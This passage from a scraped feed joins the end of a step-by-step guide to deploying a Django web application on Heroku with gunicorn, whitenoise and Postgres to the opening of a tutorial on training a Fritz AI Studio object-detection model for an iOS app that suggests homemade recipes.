<p>Install <code>gunicorn</code>, a tool that allows you to run a light-weight web server. This is essential for deployment on the Heroku platform.</p>
<pre><code> pip install gunicorn
</code></pre>
<p>Create a <code>Procfile</code>. Think of this as a way to list the process types within your web application. From the command, it can be seen that this works together with the <code>gunicorn</code> package earlier installed. Replace <code>&lt;project-name&gt;</code> with the name used when creating the Django project.</p>
<pre><code>web: gunicorn &lt;project-name&gt;.wsgi --log-file -
</code></pre>
<p>Add a <code>runtime.txt</code> file. This helps Heroku know what Python runtime you would like to use to run your application. I prefer to use the runtime I work with on my development machine. This has worked for me across a variety of deploys so far.</p>
<pre><code>python-3.7.4
</code></pre>
<h3 id="application-creation">Application creation</h3>
<p>Create an Heroku application with the following command. Here <code>&lt;app-name&gt;</code> will be replaced with the name of choice for your web app.</p>
<pre><code>heroku apps:create &lt;app-name&gt;
</code></pre>
<p>The next thing to do is creating a database. This guide favours PostgreSQL. Here is the relevant command.</p>
<pre><code>heroku addons:create heroku-postgresql:hobby-dev --version=11 --app &lt;app-name&gt;
</code></pre>
<p>If your web application is like most others, you will need to serve static files as well. An efficient tool for this can be installed as follows.</p>
<pre><code>pip install whitenoise
</code></pre>
<p><strong>Whitenoise</strong> offers a number of configuration options for Django. I have found that the following works best on Heroku with most deployments. Place this at the base of the settings file, along with the other static configurations.</p>
<pre><code>

STATICFILES_STORAGE = <span>'whitenoise.storage.CompressedStaticFilesStorage'</span>
</code></pre>
<p>It is essential to include the WhiteNoise middleware as well. This is done by placing it directly after the security middleware, and before all others. This is shown directly below.</p>
<pre><code>MIDDLEWARE = [
    <span>'django.middleware.security.SecurityMiddleware'</span>,
    <span>'whitenoise.middleware.WhiteNoiseMiddleware'</span>,
    ...
]
</code></pre>
<p>This is a good time to set up your Django app to use environment variables. A package that helps greatly with this is <code>django-environ</code>. Install this via pip, and add the following to your <code>settings.py</code> file:</p>
<pre><code><span>import</span> environ


env = environ.Env(
    DEBUG=(bool, <span>False</span>)
)
environ.Env.read_env()  

DEBUG = env(<span>'DEBUG'</span>)  
</code></pre>
<p>Place your <code>.env</code> file at a location of choice in your source code - remember to include it in your <code>.gitignore</code> file.</p>
<p>Remember to set up your <code>ALLOWED_HOSTS</code> in such a way as to create a list of valid addresses. This should be done with an environment variable. This could result in an application error if not done properly.</p>
<h3 id="creating-a-new-secret-key">Creating a new Secret Key</h3>
<p>Upon creating a Django web application a <strong>SECRET_KEY</strong> is automatically generated. In the haste of making that first commit, this can inadvertently be added to one's git history. This is a security nightmare waiting to happen.</p>
<p>You can fix this by doing the following:</p>
<ul>
<li>Access the python shell made available via Django.</li>
</ul>
<pre><code>python manage.py shell
</code></pre>
<ul>
<li>Access the <code>get_random_secret_key</code> method that comes with Django and produce a new string. This can be done repeatedly - if necessary.</li>
</ul>
<pre><code><span>from</span> django.core.management.utils <span>import</span> get_random_secret_key; print(get_random_secret_key())
</code></pre>
<p>You can save the new value generated above to an environment variable, and do the same in the settings section of your Heroku deployment(s).</p>
<h3 id="database-setup">Database setup</h3>
<p>At this point, you will need to acquire the link to the Postgres database created earlier. In the place of <code>&lt;app-name&gt;</code>, use the name you chose when creating your application on Heroku.</p>
<pre><code>heroku config:get DATABASE_URL --app &lt;app-name&gt;
</code></pre>
<p>With the newly acquired database link, you will now set this as a configuration variable via the command below. This links your Django web application once deployed to the Postgres database created.</p>
<pre><code>heroku config:add DATABASE_URL=&lt;DATABASE_URL value&gt; --app &lt;app-name&gt;
</code></pre>
<p>Your default database config should look like this.</p>
<pre><code>

DATABASES = {
    <span>'default'</span>: {
        <span>'ENGINE'</span>: <span>'django.db.backends.sqlite3'</span>,
        <span>'NAME'</span>: os.path.join(BASE_DIR, <span>'db.sqlite3'</span>),
    }
}
</code></pre>
<p>This needs to be replaced with suitable Postgres configuration that works with your Heroku deployment.</p>
<pre><code>DB_INFO = db_parser(os.environ[<span>'DATABASE_URL'</span>])

DATABASES = {
    <span>'default'</span>: {
        <span>'ENGINE'</span>: <span>'django.db.backends.postgresql_psycopg2'</span>,
        <span>'NAME'</span>: DB_INFO[<span>'name'</span>],
        <span>'USER'</span>: DB_INFO[<span>'user'</span>],
        <span>'PASSWORD'</span>: DB_INFO[<span>'password'</span>],
        <span>'HOST'</span>: DB_INFO[<span>'host'</span>],
        <span>'PORT'</span>: DB_INFO[<span>'port'</span>],
    }
}
</code></pre>
<p>For the Postgres configuration, I present to you a <a target="_blank" href="https://github.com/Usheninte/DjangoHeroku/blob/master/custom/db_url_parser.py">very rough parser</a> function. It extracts the values needed for essential fields in Databases' dictionary. These values are from the <strong>DATABASE_URL</strong> provided by Heroku.</p>
<p>What I would advise is creating a conditional that switches between these two configurations based on the value of an environmental variable. This is not totally <strong>12factor</strong> but helps with swift development setup.</p>
<pre><code>pip install psycopg2-binary
</code></pre>
<p>As a final step install the package above to help your Django application work with Postgres. According to the <a target="_blank" href="https://pypi.org/project/psycopg2-binary/">PyPI page</a>, <em>"Psycopg is the most popular PostgreSQL database adapter for the Python programming language"</em>.</p>
<h3 id="final-steps">Final steps</h3>
<p>Ensure for good measure that your Heroku app has been initialized via git. The following command helps with this:</p>
<pre><code>git remote -v
</code></pre>
<p>You should see a remote named <code>heroku</code> with a git file with name similarities to the application you created earlier.</p>
<p>If you do not see this, simply add the Heroku app manually. Do this by taking the link to the git repository in the settings section of your deployment. With this link, run the following command, replacing <code>&lt;Heroku git URL&gt;</code> with the link acquired.</p>
<pre><code>git remote add heroku &lt;Heroku git URL&gt;
</code></pre>
<p>Next, disable <strong>COLLECTSTATIC</strong> for the application. This prevents Heroku from collecting static files on your behalf. If not disabled, this can result in build failures, if static file collection does not succeed for whatever reason.</p>
<pre><code>heroku config:set DISABLE_COLLECTSTATIC=1
</code></pre>
<p>One of the most important final steps involves creating a requirements file. This is necessary to properly run the web application.</p>
<pre><code>pip freeze &gt; requirements.txt
</code></pre>
<p>We have arrived at the moment all of this has been progressing towards - deployment. The command is as follows:</p>
<pre><code>git push heroku master
</code></pre>
<p>We will need to start a web dyno, which is essentially the server of sorts. This is where our application will run on the Heroku platform.</p>
<pre><code>heroku ps:scale web=1
</code></pre>
<p>Remember to migrate the changes made during development on the deployment database as well.</p>
<pre><code>heroku run python manage.py migrate
</code></pre>
<p>Never run <code>makemigrations</code> on Heroku directly as this has little effect in the long-term. The filesystem on the platform is ephemeral and will not retain your changes beyond the moments during which your app is running. </p>
<p>For this reason, it is best to commit your migrations to git, and simply migrate these on the platform directly.</p>
<pre><code>heroku run python manage.py createsuperuser
</code></pre>
<p>Above is Heroku's flavour of the quintessential Django command. Create your superuser and your app is good to go. Configured and deployed on the Heroku platform - in the most comprehensive and efficient way.</p>
<blockquote>
<p>You might find these <a target="_blank" href="https://github.com/Usheninte/DjangoHeroku/blob/master/django_heroku_project/settings.py">settings for a sample project</a> useful. It is configured for Heroku deployment.</p>
</blockquote>
<hr>
<p><em>Cover base from <a target="_blank" href="https://unsplash.com/photos/bQzkVXkMC94">Unsplash</a></em></p>
</div></div>]]>
            </description>
            <link>https://blog.ninte.dev/how-to-deploy-a-django-web-application-to-heroku-a-comprehensive-guide-ckf7wrexw01ih5gs1gh2g7a5z</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517230</guid>
            <pubDate>Fri, 18 Sep 2020 14:30:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Train and Run an Object Detection Model Using Fritz AI Studio in iOS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24516940">thread link</a>) | @anupamchugh
<br/>
September 18, 2020 | https://heartbeat.fritz.ai/create-homemade-recipes-of-your-favorite-products-on-ios-using-fritz-ai-studio-c2c1a1fcc16d | <a href="https://web.archive.org/web/*/https://heartbeat.fritz.ai/create-homemade-recipes-of-your-favorite-products-on-ios-using-fritz-ai-studio-c2c1a1fcc16d">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="1b3f">Computer Vision ‚Äî iOS</h2><h2 id="82dd">Leverage Fritz AI to quickly generate a dataset and train an iOS-ready object detection model</h2><div><div><div><p><a href="https://heartbeat.fritz.ai/@omarmhaimdat?source=post_page-----c2c1a1fcc16d--------------------------------" rel="noopener"><img alt="Omar M‚ÄôHaimdat" src="https://miro.medium.com/fit/c/96/96/1*XIWnqvdaUXa8QjxlXcDSnw.jpeg" width="48" height="48"></a></p></div></div></div></div></div><div><div><p id="1c36">Let‚Äôs say you‚Äôre walking around your favorite grocery store looking for fresh produce or other processed foods available in the store. Then you wonder what it would take to make your own mayonnaise or even homemade Nutella.</p><p id="b2c3">The idea seems cool, but the problem with this idea is that you have to open your favorite note-taking application, start bookmarking whatever recipes you find on the internet, and then (most importantly) find the right products to buy in order to execute the recipe at home.</p><p id="7355">During quarantine, I‚Äôve enjoyed making my own sourdough bread, fresh pasta, or even pickled vegetables. Now that we‚Äôre starting to emerge out of quarantine, we can take more time to look around and try new products. While doing that, I kept asking myself what it would take to make my own Nutella or a better version of boxed mac &amp; cheese.</p><p id="4ad6">The challenge here is to rapidly detect and find the right recipe for any product for which a homemade version is available. Then I remembered‚Ä¶I‚Äôm an engineer, so maybe I can build an iOS application that can detect and classify products and recommend a recipe.</p><p id="6708">In this article, I‚Äôll use <a href="https://www.fritz.ai/product/studio.html" rel="noopener">Fritz AI Studio</a> to create a model that can detect/classify products and propose a homemade recipe with a list of ingredients needed‚Äîall done in real-time on an iOS application.</p><ol><li id="fbff">Understanding the use case</li><li id="19c8">Why Fritz AI?</li><li id="b7ee">Create a new project in Fritz AI Studio</li><li id="ef83">Fritz AI dataset generator</li><li id="b1b2">Train an object detection model with Fritz AI</li><li id="b6e9">Build the iOS application</li><li id="2b6d">Conclusion &amp; perspectives</li></ol><p id="38b5">I have included code in this article where it‚Äôs most instructive. Full code and data can be found on my <a href="https://github.com/omarmhaimdat" rel="noopener">GitHub page</a>. Let‚Äôs get started.</p></div></div></section><hr><section><div><div><p id="d9f9">The idea is pretty simple and straightforward‚ÄîI want to be able to easily open my phone and point the camera at a product and instantly get a proposition for a homemade recipe, including a list of products I should have in order to execute it.</p><p id="0204">The whole process should be easy and fast for the use‚ÄîI envision it as the following:</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4800/1*INqh_FoWjwA7m0dbUP0_pg.png" width="2400" height="281" srcset="https://miro.medium.com/max/552/1*INqh_FoWjwA7m0dbUP0_pg.png 276w, https://miro.medium.com/max/1104/1*INqh_FoWjwA7m0dbUP0_pg.png 552w, https://miro.medium.com/max/1280/1*INqh_FoWjwA7m0dbUP0_pg.png 640w, https://miro.medium.com/max/1456/1*INqh_FoWjwA7m0dbUP0_pg.png 728w, https://miro.medium.com/max/1632/1*INqh_FoWjwA7m0dbUP0_pg.png 816w, https://miro.medium.com/max/1808/1*INqh_FoWjwA7m0dbUP0_pg.png 904w, https://miro.medium.com/max/1984/1*INqh_FoWjwA7m0dbUP0_pg.png 992w, https://miro.medium.com/max/2000/1*INqh_FoWjwA7m0dbUP0_pg.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*INqh_FoWjwA7m0dbUP0_pg.png?q=20"></p></div></div></div><figcaption>Figure 1: Simplified process</figcaption></figure></div></div></div></section><hr><section><div><div><p id="ef4a">There are many ways to implement the use case explained above, but major obstacles might stop you from experimenting and rapidly iterating through your idea. Fritz AI has a number of benefits that I think make it perfect for these kinds of projects:</p><ul><li id="ac3e"><strong>Dataset generator: </strong>Since I don‚Äôt have the resources or the time to create a dataset of thousands of images, Fritz AI allows you, with very few initial images, to generate an important set of images using the Snapshot feature.</li><li id="e76a"><strong>Easy and fast:</strong> Using Fritz AI, I know that I can stay in the same environment, and I don‚Äôt have to worry if the training process went well, basically I only need to half monitor the process.</li><li id="ff05"><strong>Generous free tier:</strong> 5 hours of training per month and 10,000 dataset images. It‚Äôs generous enough to get you started.</li><li id="fd44"><strong>Optimized mobile-ready models:</strong> Fritz AI models are designed to perform well in mobile environments, where inference time is key and accuracy is a major plus.</li></ul><p id="b1ff">Many other features are interesting but more focused on the production side, which isn‚Äôt coved in this article.</p></div></div></section><hr><section></section><hr><section><div><div><p id="ed00">You can create a new project in the left menu. To do this, you‚Äôll need to:</p><ul><li id="1091">Specify the project type‚Äî<strong>custom</strong> means you can train a model with your own dataset.</li><li id="cafd">The model type‚Äîobject detection for this project</li><li id="205b">Upload your dataset (optional‚Äîwe don‚Äôt have a dataset to start out, so we won‚Äôt do this yet)</li></ul></div></div><div><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*LFILdabdMrr-SkyokWeIpA.png" width="3264" height="663" srcset="https://miro.medium.com/max/552/1*LFILdabdMrr-SkyokWeIpA.png 276w, https://miro.medium.com/max/1104/1*LFILdabdMrr-SkyokWeIpA.png 552w, https://miro.medium.com/max/1280/1*LFILdabdMrr-SkyokWeIpA.png 640w, https://miro.medium.com/max/1456/1*LFILdabdMrr-SkyokWeIpA.png 728w, https://miro.medium.com/max/1632/1*LFILdabdMrr-SkyokWeIpA.png 816w, https://miro.medium.com/max/1808/1*LFILdabdMrr-SkyokWeIpA.png 904w, https://miro.medium.com/max/1984/1*LFILdabdMrr-SkyokWeIpA.png 992w, https://miro.medium.com/max/2160/1*LFILdabdMrr-SkyokWeIpA.png 1080w, https://miro.medium.com/max/2700/1*LFILdabdMrr-SkyokWeIpA.png 1350w, https://miro.medium.com/max/3240/1*LFILdabdMrr-SkyokWeIpA.png 1620w, https://miro.medium.com/max/3780/1*LFILdabdMrr-SkyokWeIpA.png 1890w, https://miro.medium.com/max/4320/1*LFILdabdMrr-SkyokWeIpA.png 2160w, https://miro.medium.com/max/4800/1*LFILdabdMrr-SkyokWeIpA.png 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*LFILdabdMrr-SkyokWeIpA.png?q=20"></p></div></div><figcaption>Figure 2: Create a new Object Detection project</figcaption></figure></div><div><p id="db5a">In this project, we want to detect and classify a product. As such, we choose to build and <a href="https://www.fritz.ai/object-detection/" rel="noopener">object detection</a> model. You can directly add your dataset during this process, but I choose to look around before uploading images.</p></div></section><hr><section><div><div><p id="0d20">There are five main steps in this part of the process:</p><ul><li id="293c"><strong>Collect:</strong> The dataset generator requires a set of transparent images to get started, because it will use the transparent images and overlay them on a bunch of random images. There are many ways to find these ‚Äúseed‚Äù images‚Äîyou can start looking for images of the products you want the model to identify. You can use Google images as a way to accelerate this process‚ÄîFacebook and Instagram can also be useful. There‚Äôs a way to filter out transparent images in Google, but be careful, because sometimes they are not fully transparent or are only partially transparent.</li></ul><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*IcafZFW8gdsI0nIvI6wqYQ.png" width="3264" height="1629" srcset="https://miro.medium.com/max/552/1*IcafZFW8gdsI0nIvI6wqYQ.png 276w, https://miro.medium.com/max/1104/1*IcafZFW8gdsI0nIvI6wqYQ.png 552w, https://miro.medium.com/max/1280/1*IcafZFW8gdsI0nIvI6wqYQ.png 640w, https://miro.medium.com/max/1400/1*IcafZFW8gdsI0nIvI6wqYQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*IcafZFW8gdsI0nIvI6wqYQ.png?q=20"></p></div></div></div><figcaption>Figure 3: Not fully transparent and partially transparent images</figcaption></figure><ul><li id="7a00"><strong>Remove the background:</strong> Plenty of services propose a way to remove image backgrounds for free such as <a href="https://www.remove.bg/" rel="noopener">remove.bg</a> or <a href="https://clippingmagic.com/" rel="noopener">clippingmagic.com</a>. If you don‚Äôt want to use these services, <a href="https://www.adobe.com/products/photoshop.html" rel="noopener">Photoshop</a> can be used, as well as Preview (macOS only) or <a href="https://www.gimp.org/" rel="noopener">GIMP</a>.</li><li id="de5b"><strong>Upload:</strong> When all the images are ready, go to Datasets -&gt; Add Image Collection -&gt; Upload images</li></ul></div></div><div><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*RWII2XZIQ6L5jgScEGgkUg.png" width="3264" height="647" srcset="https://miro.medium.com/max/552/1*RWII2XZIQ6L5jgScEGgkUg.png 276w, https://miro.medium.com/max/1104/1*RWII2XZIQ6L5jgScEGgkUg.png 552w, https://miro.medium.com/max/1280/1*RWII2XZIQ6L5jgScEGgkUg.png 640w, https://miro.medium.com/max/1456/1*RWII2XZIQ6L5jgScEGgkUg.png 728w, https://miro.medium.com/max/1632/1*RWII2XZIQ6L5jgScEGgkUg.png 816w, https://miro.medium.com/max/1808/1*RWII2XZIQ6L5jgScEGgkUg.png 904w, https://miro.medium.com/max/1984/1*RWII2XZIQ6L5jgScEGgkUg.png 992w, https://miro.medium.com/max/2160/1*RWII2XZIQ6L5jgScEGgkUg.png 1080w, https://miro.medium.com/max/2700/1*RWII2XZIQ6L5jgScEGgkUg.png 1350w, https://miro.medium.com/max/3240/1*RWII2XZIQ6L5jgScEGgkUg.png 1620w, https://miro.medium.com/max/3780/1*RWII2XZIQ6L5jgScEGgkUg.png 1890w, https://miro.medium.com/max/4320/1*RWII2XZIQ6L5jgScEGgkUg.png 2160w, https://miro.medium.com/max/4800/1*RWII2XZIQ6L5jgScEGgkUg.png 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*RWII2XZIQ6L5jgScEGgkUg.png?q=20"></p></div></div><figcaption>Figure 4: Create a new Seed Image Collection</figcaption></figure></div><div><div><p id="eea5">In the process of uploading, Fritz AI will warn you if any image is not transparent‚Äîyou can delete it and upload it afterwards for better results. I was hoping this could be enforced in some way, or maybe even have Fritz AI propose a segmentation of the background inside the webapp itself.</p><ul><li id="d4a1"><strong>Annotate:</strong> when all images are uploaded, a whole new menu at the top will appear with an image annotation interface. The process is pretty simple and straightforward. You start by creating new classes, with each one having a different color. In my case, I have three classes (nutella, mayonnaise_hellmann, mac_cheese) and 100 images (insufficient, IMO).</li></ul></div></div><div><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*38AXUSeLjjFHM2ucfUvlJg.png" width="3264" height="481" srcset="https://miro.medium.com/max/552/1*38AXUSeLjjFHM2ucfUvlJg.png 276w, https://miro.medium.com/max/1104/1*38AXUSeLjjFHM2ucfUvlJg.png 552w, https://miro.medium.com/max/1280/1*38AXUSeLjjFHM2ucfUvlJg.png 640w, https://miro.medium.com/max/1456/1*38AXUSeLjjFHM2ucfUvlJg.png 728w, https://miro.medium.com/max/1632/1*38AXUSeLjjFHM2ucfUvlJg.png 816w, https://miro.medium.com/max/1808/1*38AXUSeLjjFHM2ucfUvlJg.png 904w, https://miro.medium.com/max/1984/1*38AXUSeLjjFHM2ucfUvlJg.png 992w, https://miro.medium.com/max/2160/1*38AXUSeLjjFHM2ucfUvlJg.png 1080w, https://miro.medium.com/max/2700/1*38AXUSeLjjFHM2ucfUvlJg.png 1350w, https://miro.medium.com/max/3240/1*38AXUSeLjjFHM2ucfUvlJg.png 1620w, https://miro.medium.com/max/3780/1*38AXUSeLjjFHM2ucfUvlJg.png 1890w, https://miro.medium.com/max/4320/1*38AXUSeLjjFHM2ucfUvlJg.png 2160w, https://miro.medium.com/max/4800/1*38AXUSeLjjFHM2ucfUvlJg.png 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*38AXUSeLjjFHM2ucfUvlJg.png?q=20"></p></div></div><figcaption>Figure 5: Create classes and annotate</figcaption></figure></div><div><div><ul><li id="89f5"><strong>Generate:</strong> This is where all the magic happens. With your labeled seed images, Fritz AI will create synthetic images based on your original images, with some sort of augmentation built-in (I wish I had control of this part). You can also monitor how many images have been generated.</li></ul></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/5760/1*z4zRuBpkwQWn0zjWvZ0nrw.png" width="2880" height="816" srcset="https://miro.medium.com/max/552/1*z4zRuBpkwQWn0zjWvZ0nrw.png 276w, https://miro.medium.com/max/1104/1*z4zRuBpkwQWn0zjWvZ0nrw.png 552w, https://miro.medium.com/max/1280/1*z4zRuBpkwQWn0zjWvZ0nrw.png 640w, https://miro.medium.com/max/1456/1*z4zRuBpkwQWn0zjWvZ0nrw.png 728w, https://miro.medium.com/max/1632/1*z4zRuBpkwQWn0zjWvZ0nrw.png 816w, https://miro.medium.com/max/1808/1*z4zRuBpkwQWn0zjWvZ0nrw.png 904w, https://miro.medium.com/max/1984/1*z4zRuBpkwQWn0zjWvZ0nrw.png 992w, https://miro.medium.com/max/2000/1*z4zRuBpkwQWn0zjWvZ0nrw.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*z4zRuBpkwQWn0zjWvZ0nrw.png?q=20"></p></div></div></div><figcaption>Figure 6: Monitor the snapshot generation</figcaption></figure></div></div></div><div><div><p id="127f">You will notice that it will propose a number of generated images relative to the number of classes you have. In this case, I have three classes, which means it naturally proposed 9,900 images rather than the 10,000 I was aiming for. This helps in making sure we end up with a balanced dataset Snapshot.</p><p id="1c91">Fritz AI will send you an email when this process is finished. The images created are a bunch of random images on which they overlay the labeled, transparent seed images. It‚Äôs kind of brilliant because you can change the context in which an image is taken, and helps ensure a more diverse dataset for better model training.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4700/1*UB6l-L5ljrzWSMl5JD3Ksw.png" width="2350" height="1182" srcset="https://miro.medium.com/max/552/1*UB6l-L5ljrzWSMl5JD3Ksw.png 276w, https://miro.medium.com/max/1104/1*UB6l-L5ljrzWSMl5JD3Ksw.png 552w, https://miro.medium.com/max/1280/1*UB6l-L5ljrzWSMl5JD3Ksw.png 640w, https://miro.medium.com/max/1456/1*UB6l-L5ljrzWSMl5JD3Ksw.png 728w, https://miro.medium.com/max/1632/1*UB6l-L5ljrzWSMl5JD3Ksw.png 816w, https://miro.medium.com/max/1808/1*UB6l-L5ljrzWSMl5JD3Ksw.png 904w, https://miro.medium.com/max/1984/1*UB6l-L5ljrzWSMl5JD3Ksw.png 992w, https://miro.medium.com/max/2000/1*UB6l-L5ljrzWSMl5JD3Ksw.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*UB6l-L5ljrzWSMl5JD3Ksw.png?q=20"></p></div></div></div><figcaption>Figure 7: An example of images generated by Fritz Dataset Generator</figcaption></figure></div></div></div><div><p id="e748">At this point, you should have everything needed to start training a model. Keep in mind that you might need to go back in order to improve your seed images or add even more datasets after your first training iteration.</p></div></section><hr><section></section><hr><section><div><div><p id="6e50">The training part is for me the most well-conceived part of the process because it‚Äôs so easy to follow. It‚Äôs a simple step-by-step process that is clear in terms of what I‚Äôm looking for. Here are my preferences:</p><ul><li id="7e63">I want to use the dataset I generated</li><li id="35c9">I‚Äôm looking for an accurate model. The latency is more than acceptable (84ms on iPhone X) for me, since the objective is to point and detect/classify‚Äîno need to optimize for real-time inference p(more suitable for live video processing).</li></ul><p id="f903">The process is just easy and simple. You can choose your training budget, but if the model converges before, you won‚Äôt be charged for the rest, and an email will be sent to confirm that the model has finished training and is ready to download.</p></div></div><div><div><div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/5760/1*7sIEYWdBfS5BLJFeqL_XEA.png" width="2880" height="1680" srcset="https://miro.medium.com/max/552/1*7sIEYWdBfS5BLJFeqL_XEA.png 276w, https://miro.medium.com/max/1104/1*7sIEYWdBfS5BLJFeqL_XEA.png 552w, https://miro.medium.com/max/1280/1*7sIEYWdBfS5BLJFeqL_XEA.png 640w, https://miro.medium.com/max/1456/1*7sIEYWdBfS5BLJFeqL_XEA.png 728w, https://miro.medium.com/max/1632/1*7sIEYWdBfS5BLJFeqL_XEA.png 816w, https://miro.medium.com/max/1808/1*7sIEYWdBfS5BLJFeqL_XEA.png 904w, https://miro.medium.com/max/1984/1*7sIEYWdBfS5BLJFeqL_XEA.png 992w, https://miro.medium.com/max/2000/1*7sIEYWdBfS5BLJFeqL_XEA.png 1000w" sizes="1000px" data-old-src="https://miro.medium.com/max/60/1*7sIEYWdBfS5BLJFeqL_XEA.png?q=20"></p></div></div></div><figcaption>Figure 8: The training step-by-step menu</figcaption></figure></div></div></div><div><div><p id="a027">By looking at your training job details, you can see when you submitted the job and when it completed. You can also see how long your model took to converge‚Äîmine took 5 hours and 13 minutes.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4964/1*TXY8_7U6rrgl8d93-x2xtw.png" width="2482" height="1232" srcset="https://miro.medium.com/max/552/1*TXY8_7U6rrgl8d93-x2xtw.png 276w, https://miro.medium.com/max/1104/1*TXY8_7U6rrgl8d93-x2xtw.png 552w, https://miro.medium.com/max/1280/1*TXY8_7U6rrgl8d93-x2xtw.png 640w, https://miro.medium.com/max/1400/1*TXY8_7U6rrgl8d93-x2xtw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*TXY8_7U6rrgl8d93-x2xtw.png?q=20"></p></div></div></div><figcaption>Figure 9: An overview of the training job</figcaption></figure><p id="3be8">We can download the <code>.mlmodel</code> file at this point and start experimenting with the model.</p></div></div></section><hr><section><div><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/6528/1*Q6MudCXFB_eSZn2QUX4d3w.png" width="3264" height="739" srcset="https://miro.medium.com/max/552/1*Q6MudCXFB_eSZn2QUX4d3w.png 276w, https://miro.medium.com/max/1104/1*Q6MudCXFB_eSZn2QUX4d3w.png 552w, https://miro.medium.com/max/1280/1*Q6MudCXFB_eSZn2QUX4d3w.png 640w, https://miro.medium.com/max/1456/1*Q6MudCXFB_eSZn2QUX4d3w.png 728w, https://miro.medium.com/max/1632/1*Q6MudCXFB_eSZn2QUX4d3w.png 816w, https://miro.medium.com/max/1808/1*Q6MudCXFB_eSZn2QUX4d3w.png 904w, https://miro.medium.com/max/1984/1*Q6MudCXFB_eSZn2QUX4d3w.png 992w, https://miro.medium.com/max/2160/1*Q6MudCXFB_eSZn2QUX4d3w.png 1080w, https://miro.medium.com/max/2700/1*Q6MudCXFB_eSZn2QUX4d3w.png 1350w, https://miro.medium.com/max/3240/1*Q6MudCXFB_eSZn2QUX4d3w.png 1620w, https://miro.medium.com/max/3780/1*Q6MudCXFB_eSZn2QUX4d3w.png 1890w, https://miro.medium.com/max/4320/1*Q6MudCXFB_eSZn2QUX4d3w.png 2160w, https://miro.medium.com/max/4800/1*Q6MudCXFB_eSZn2QUX4d3w.png 2400w" sizes="100vw" data-old-src="https://miro.medium.com/max/60/1*Q6MudCXFB_eSZn2QUX4d3w.png?q=20"></p></div></div><figcaption>Figure 10: Create a new Single View Application</figcaption></figure></div><div><div><p id="73eb">Now we have our project ready to go. I don‚Äôt like using storyboards myself, so the app in this tutorial is built programmatically, which means no buttons or switches to toggle ‚Äî just pure code.</p><blockquote><p id="ee0c"><strong>Editor‚Äôs note:</strong> If you need a demo camera-based app to get started and test model performance quickly, <a href="https://github.com/fritzlabs/fritz-examples" rel="noopener">check out our repo of demo projects for both iOS and Android</a>.</p></blockquote><p id="eb1f">To follow this method, you‚Äôll have to delete the <code>main.storyboard</code> file and set your <code>SceneDelegate.swift</code> file (Xcode 11 &amp; 12 only).</p><p id="01e7">With Xcode 11 &amp; 12, you‚Äôll have to change the <code>Info.plist</code> file like so:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3500/0*-rWtm5bD59baeAJP.png" width="1750" height="896" srcset="https://miro.medium.com/max/552/0*-rWtm5bD59baeAJP.png 276w, https://miro.medium.com/max/1104/0*-rWtm5bD59baeAJP.png 552w, https://miro.medium.com/max/1280/0*-rWtm5bD59baeAJP.png 640w, https://miro.medium.com/max/1400/0*-rWtm5bD59baeAJP.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*-rWtm5bD59baeAJP.png?q=20"></p></div></div></div><figcaption>Figure 11: delete the Storyboard Name from the .plist file</figcaption></figure><p id="e075">You need to delete the ‚ÄúStoryboard Name‚Äù in the file, and that‚Äôs about it.</p><p id="dae0">Change the <code>SceneDelegate</code> with the following code:</p><figure><div></div></figure><h2 id="2e94">Install Fritz pod package</h2><p id="ea2a">You‚Äôll need to go to your project directory using your favorite terminal and type the following command:</p><pre><span id="eb4b">pod init</span></pre><p id="c232">Change the <code>Podfile</code> with the following text:</p><pre><span id="62f0"># If you are on Xcode 11<br>pod ‚ÄòFritz‚Äô <br># If you are on Xcode 12 beta<br>pod 'Fritz', '~&gt; 6.0.0-beta.1'</span></pre><p id="9bd7">When everything is installed, you should be able to open your <code>.xcworkspace</code> file.</p><h2 id="32ee">Add the model file in your project</h2><p id="f065">Import the <code>.mlmodel</code> downloaded from Fritz‚Äôs website, Xcode will handle everything. The next step is to extend the model‚Äôs class by adding the following code:</p><figure><div></div></figure><p id="05e8">You can replace <code>MODEL_IDENTIFIER</code> by going to Training -&gt; Select the Training Job -&gt; Copy the ID for the Core ML model file:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/5760/1*H7DzGc4lwxclC2Q2YTVfug.png" width="2880" height="1671" srcset="https://miro.medium.com/max/552/1*H7DzGc4lwxclC2Q2YTVfug.png 276w, https://miro.medium.com/max/1104/1*H7DzGc4lwxclC2Q2YTVfug.png 552w, https://miro.medium.com/max/1280/1*H7DzGc4lwxclC2Q2YTVfug.png 640w, https://miro.medium.com/max/1400/1*H7DzGc4lwxclC2Q2YTVfug.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*H7DzGc4lwxclC2Q2YTVfug.png?q=20"></p></div></div></div><figcaption>Figure 12: Copy the model identifier</figcaption></figure><h2 id="6dec">Create View Controllers</h2><p id="1fc4">We need two ViewControllers:</p><ul><li id="d090"><code><strong>ViewController()</strong></code><strong>:</strong></li></ul><p id="0e42">This is where we‚Äôll set our application entry point and set the camera view with the proper code to handle the model‚Äôs detection and classification.</p><ul><li 